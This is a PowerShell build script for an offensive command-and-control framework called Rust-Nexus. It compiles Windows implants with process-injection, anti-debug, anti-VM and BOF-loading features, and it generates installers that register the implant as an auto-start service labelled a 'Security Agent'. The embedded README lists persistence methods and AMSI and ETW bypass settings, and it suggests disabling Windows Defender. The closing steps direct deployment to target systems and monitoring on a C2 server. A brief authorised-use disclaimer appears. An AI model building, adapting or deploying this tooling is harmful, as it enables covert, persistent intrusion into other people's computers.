# Windows-specific Build Script for Rust-Nexus
# PowerShell script for building Windows agents with optimized configurations

param(
    [string]$BuildType = "release",
    [string]$Architecture = "all"
)

# Colors for output (PowerShell equivalents)
function Write-ColorOutput($ForegroundColor, $Message) {
    Write-Host $Message -ForegroundColor $ForegroundColor
}

Write-ColorOutput "Blue" "🪟 Building Rust-Nexus for Windows Platforms"
Write-ColorOutput "Blue" "=============================================="

# Configuration
$OutputDir = "target\builds"
$ConfigDir = "config"

# Create output directory
if (!(Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
}

Write-ColorOutput "Blue" "Build Configuration:"
Write-Host "  Build Type: $BuildType"
Write-Host "  Architecture: $Architecture"
Write-Host "  Output Directory: $OutputDir"
Write-Host ""

# Check for Windows agent configuration
if (!(Test-Path "$ConfigDir\agent-windows.toml")) {
    Write-ColorOutput "Red" "❌ Windows agent configuration not found: $ConfigDir\agent-windows.toml"
    exit 1
}

Write-ColorOutput "Green" "✅ Windows agent configuration found"

# Check if Rust is installed
try {
    $rustVersion = cargo --version
    Write-ColorOutput "Green" "✅ Rust toolchain found: $rustVersion"
} catch {
    Write-ColorOutput "Red" "❌ Rust/Cargo not found. Please install Rust first."
    Write-Host "Install from: https://rustup.rs/"
    exit 1
}

# Windows targets
$WindowsTargets = @(
    "x86_64-pc-windows-msvc",
    "i686-pc-windows-msvc",
    "x86_64-pc-windows-gnu",
    "i686-pc-windows-gnu"
)

# Check available targets
$AvailableTargets = @()
foreach ($target in $WindowsTargets) {
    $installed = rustup target list --installed | Select-String $target
    if ($installed) {
        $AvailableTargets += $target
        Write-ColorOutput "Green" "✅ Target available: $target"
    } else {
        Write-ColorOutput "Yellow" "⚠️  Target not installed: $target"
        Write-Host "   Install with: rustup target add $target"
    }
}

if ($AvailableTargets.Count -eq 0) {
    Write-ColorOutput "Red" "❌ No Windows targets available for cross-compilation"
    Write-Host "Install at least one target with: rustup target add x86_64-pc-windows-msvc"
    exit 1
}

# Build function for Windows
function Build-WindowsAgent {
    param(
        [string]$Target,
        [string]$OutputDir,
        [string]$ConfigDir
    )

    $Arch = $Target.Split('-')[0]
    $Toolchain = $Target.Split('-')[-1]

    Write-ColorOutput "Blue" "🔧 Building Windows agent for $Target..."

    Push-Location nexus-agent

    try {
        # Windows-specific features
        $Features = "--features windows-specific,bof-loading,wmi-execution,anti-debug,anti-vm,process-injection"

        # Build command
        $BuildCmd = "cargo build --release --target $Target $Features"

        Write-Host "Executing: $BuildCmd"

        # Execute build
        $process = Start-Process -FilePath "cargo" -ArgumentList "build", "--release", "--target", $Target, "--features", "windows-specific,bof-loading,wmi-execution,anti-debug,anti-vm,process-injection" -Wait -NoNewWindow -PassThru

        if ($process.ExitCode -eq 0) {
            Write-ColorOutput "Green" "✅ Successfully built Windows agent for $Target"

            # Copy binary with descriptive name
            $BinaryName = "nexus-agent-windows-$Arch-$Toolchain.exe"
            $SourcePath = "target\$Target\release\nexus-agent.exe"
            $DestPath = "..\$OutputDir\$BinaryName"

            Copy-Item $SourcePath $DestPath

            # Copy configuration
            $ConfigName = "agent-windows-$Arch-$Toolchain.toml"
            Copy-Item "..\$ConfigDir\agent-windows.toml" "..\$OutputDir\$ConfigName"

            Write-ColorOutput "Blue" "📦 Created: $OutputDir\$BinaryName"
            Write-ColorOutput "Blue" "📄 Config: $OutputDir\$ConfigName"

            return $true
        } else {
            Write-ColorOutput "Red" "❌ Failed to build Windows agent for $Target"
            return $false
        }
    } finally {
        Pop-Location
    }
}

# Build server
Write-ColorOutput "Blue" "🔧 Building nexus-server..."
Push-Location nexus-server

try {
    $process = Start-Process -FilePath "cargo" -ArgumentList "build", "--release" -Wait -NoNewWindow -PassThru

    if ($process.ExitCode -eq 0) {
        Write-ColorOutput "Green" "✅ Successfully built nexus-server"
        Copy-Item "target\release\nexus-server.exe" "..\$OutputDir\nexus-server-windows.exe"
    } else {
        Write-ColorOutput "Red" "❌ Failed to build nexus-server"
        exit 1
    }
} finally {
    Pop-Location
}

# Build agents for all available targets
$SuccessCount = 0
$TotalTargets = $AvailableTargets.Count

foreach ($target in $AvailableTargets) {
    if (Build-WindowsAgent -Target $target -OutputDir $OutputDir -ConfigDir $ConfigDir) {
        $SuccessCount++
    }
}

# Create deployment package
Write-ColorOutput "Blue" "📦 Creating Windows deployment package..."
$PackageName = "nexus-windows-$(Get-Date -Format 'yyyyMMdd_HHmmss')"
$PackageDir = "$OutputDir\$PackageName"
New-Item -ItemType Directory -Path $PackageDir -Force | Out-Null

# Copy all Windows binaries and configs
Get-ChildItem "$OutputDir\nexus-agent-windows-*" -ErrorAction SilentlyContinue | Copy-Item -Destination $PackageDir
Get-ChildItem "$OutputDir\agent-windows-*" -ErrorAction SilentlyContinue | Copy-Item -Destination $PackageDir
if (Test-Path "$OutputDir\nexus-server-windows.exe") {
    Copy-Item "$OutputDir\nexus-server-windows.exe" $PackageDir
}

# Create installation script (batch file)
$InstallScript = @"
@echo off
setlocal EnableDelayedExpansion

REM Nexus Windows Installation Script

echo Installing Nexus Agent for Windows...

REM Check for administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script must be run as Administrator
    pause
    exit /b 1
)

REM Detect architecture
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
    set ARCH=x86_64
) else if "%PROCESSOR_ARCHITECTURE%"=="x86" (
    set ARCH=i686
) else (
    echo Unsupported architecture: %PROCESSOR_ARCHITECTURE%
    pause
    exit /b 1
)

REM Choose toolchain (prefer MSVC)
set BINARY=nexus-agent-windows-%ARCH%-msvc.exe
set CONFIG=agent-windows-%ARCH%-msvc.toml

if not exist "%BINARY%" (
    set BINARY=nexus-agent-windows-%ARCH%-gnu.exe
    set CONFIG=agent-windows-%ARCH%-gnu.toml
)

if not exist "%BINARY%" (
    echo Binary not found for architecture %ARCH%
    pause
    exit /b 1
)

REM Create installation directory
set INSTALL_DIR=C:\Program Files\Nexus
mkdir "%INSTALL_DIR%" 2>nul

REM Copy binary and config
copy "%BINARY%" "%INSTALL_DIR%\nexus-agent.exe"
copy "%CONFIG%" "%INSTALL_DIR%\agent.toml"

REM Create Windows service
sc create "NexusAgent" binPath= "\"%INSTALL_DIR%\nexus-agent.exe\" --config \"%INSTALL_DIR%\agent.toml\"" start= auto
sc description "NexusAgent" "Nexus Security Agent Service"

REM Start service
sc start "NexusAgent"

echo Nexus Agent installed and started successfully!
echo Status: sc query NexusAgent
echo Logs: Check Windows Event Log
pause
"@

$InstallScript | Out-File -FilePath "$PackageDir\install.bat" -Encoding ASCII

# Create PowerShell installation script
$PowerShellInstall = @"
# Nexus Windows PowerShell Installation Script

Write-Host "Installing Nexus Agent for Windows..." -ForegroundColor Green

# Check for administrator privileges
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "This script must be run as Administrator" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Detect architecture
`$Arch = if ([Environment]::Is64BitOperatingSystem) { "x86_64" } else { "i686" }

# Choose binary (prefer MSVC)
`$Binary = "nexus-agent-windows-`$Arch-msvc.exe"
`$Config = "agent-windows-`$Arch-msvc.toml"

if (!(Test-Path `$Binary)) {
    `$Binary = "nexus-agent-windows-`$Arch-gnu.exe"
    `$Config = "agent-windows-`$Arch-gnu.toml"
}

if (!(Test-Path `$Binary)) {
    Write-Host "Binary not found for architecture `$Arch" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Create installation directory
`$InstallDir = "C:\Program Files\Nexus"
New-Item -ItemType Directory -Path `$InstallDir -Force | Out-Null

# Copy binary and config
Copy-Item `$Binary "`$InstallDir\nexus-agent.exe"
Copy-Item `$Config "`$InstallDir\agent.toml"

# Create Windows service
New-Service -Name "NexusAgent" -BinaryPathName "`"`$InstallDir\nexus-agent.exe`" --config `"`$InstallDir\agent.toml`"" -StartupType Automatic -Description "Nexus Security Agent Service"

# Start service
Start-Service -Name "NexusAgent"

Write-Host "Nexus Agent installed and started successfully!" -ForegroundColor Green
Write-Host "Status: Get-Service NexusAgent"
Write-Host "Logs: Check Windows Event Log"
Read-Host "Press Enter to exit"
"@

$PowerShellInstall | Out-File -FilePath "$PackageDir\install.ps1" -Encoding UTF8

# Create README
$Readme = @"
# Nexus Windows Deployment Package

This package contains pre-compiled Nexus agents for Windows platforms.

## Contents

- ``nexus-agent-windows-*``: Agent binaries for different architectures and toolchains
- ``agent-windows-*.toml``: Platform-specific configuration files
- ``nexus-server-windows.exe``: Server binary (if included)
- ``install.bat``: Batch installation script
- ``install.ps1``: PowerShell installation script

## Quick Installation

### Using Batch Script (Recommended)
1. Right-click ``install.bat`` and select "Run as administrator"
2. The script will automatically detect your architecture and install the agent

### Using PowerShell Script
1. Open PowerShell as Administrator
2. Run: ``Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser``
3. Run: ``.\install.ps1``

## Manual Installation

1. Choose the appropriate binary for your system:
   - ``nexus-agent-windows-x86_64-msvc.exe``: 64-bit Windows (MSVC)
   - ``nexus-agent-windows-i686-msvc.exe``: 32-bit Windows (MSVC)
   - ``nexus-agent-windows-*-gnu.exe``: GNU toolchain variants

2. Copy to Program Files:
   ``````
   copy nexus-agent-windows-x86_64-msvc.exe "C:\Program Files\Nexus\nexus-agent.exe"
   copy agent-windows-x86_64-msvc.toml "C:\Program Files\Nexus\agent.toml"
   ``````

3. Create and start Windows service:
   ``````
   sc create "NexusAgent" binPath= "\"C:\Program Files\Nexus\nexus-agent.exe\" --config \"C:\Program Files\Nexus\agent.toml\"" start= auto
   sc start "NexusAgent"
   ``````

## Configuration

Edit the configuration file to match your environment:
- Update C2 server endpoints
- Configure persistence methods (service, registry, startup)
- Adjust evasion settings (AMSI bypass, ETW bypass, etc.)
- Set performance limits

## Service Management

- Check status: ``sc query NexusAgent`` or ``Get-Service NexusAgent``
- Stop service: ``sc stop NexusAgent`` or ``Stop-Service NexusAgent``
- Start service: ``sc start NexusAgent`` or ``Start-Service NexusAgent``
- Remove service: ``sc delete NexusAgent`` or ``Remove-Service NexusAgent``

## Persistence Methods

The Windows agent supports multiple persistence mechanisms:
- **Windows Service** (default): Runs as system service
- **Registry Run Keys**: Auto-start entries
- **Startup Folder**: User/system startup shortcuts
- **Scheduled Tasks**: Time-based execution
- **WMI Events**: Advanced persistence (use with caution)

## Security Notes

- This is a penetration testing framework
- Only use on authorized systems
- Follow all applicable laws and regulations
- Ensure proper operational security
- Be aware of Windows Defender and other AV solutions

## Troubleshooting

- Check Windows Event Log for error messages
- Verify firewall allows outbound connections
- Ensure C2 server endpoints are reachable
- Test with Windows Defender disabled for initial setup
"@

$Readme | Out-File -FilePath "$PackageDir\README.md" -Encoding UTF8

# Create archive
Write-ColorOutput "Blue" "📦 Creating deployment archive..."
$ArchivePath = "$OutputDir\$PackageName.zip"
Compress-Archive -Path $PackageDir -DestinationPath $ArchivePath -Force
Write-ColorOutput "Green" "📦 Created deployment package: $ArchivePath"

# Summary
Write-Host ""
Write-ColorOutput "Green" "🎉 Windows build completed!"
Write-ColorOutput "Blue" "📊 Build Summary:"
Write-Host "  Successfully built: $SuccessCount/$TotalTargets targets"
Write-Host "  Output directory: $OutputDir"
Write-Host "  Deployment package: $PackageName.zip"
Write-Host ""
Write-ColorOutput "Blue" "📋 Available binaries:"
Get-ChildItem "$OutputDir\nexus-agent-windows-*" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  $($_.Name)" }
Write-Host ""
Write-ColorOutput "Yellow" "📋 Next steps:"
Write-Host "1. Deploy the package to target Windows systems"
Write-Host "2. Configure C2 server endpoints in the .toml files"
Write-Host "3. Run the installation script on target systems as Administrator"
Write-Host "4. Monitor agent connections on your C2 server"
Write-Host ""
Write-ColorOutput "Yellow" "⚠️  Important Notes:"
Write-Host "• Run installation scripts as Administrator"
Write-Host "• Configure Windows Firewall if necessary"
Write-Host "• Consider antivirus exclusions during testing"
Write-Host "• Monitor Windows Event Logs for agent status"
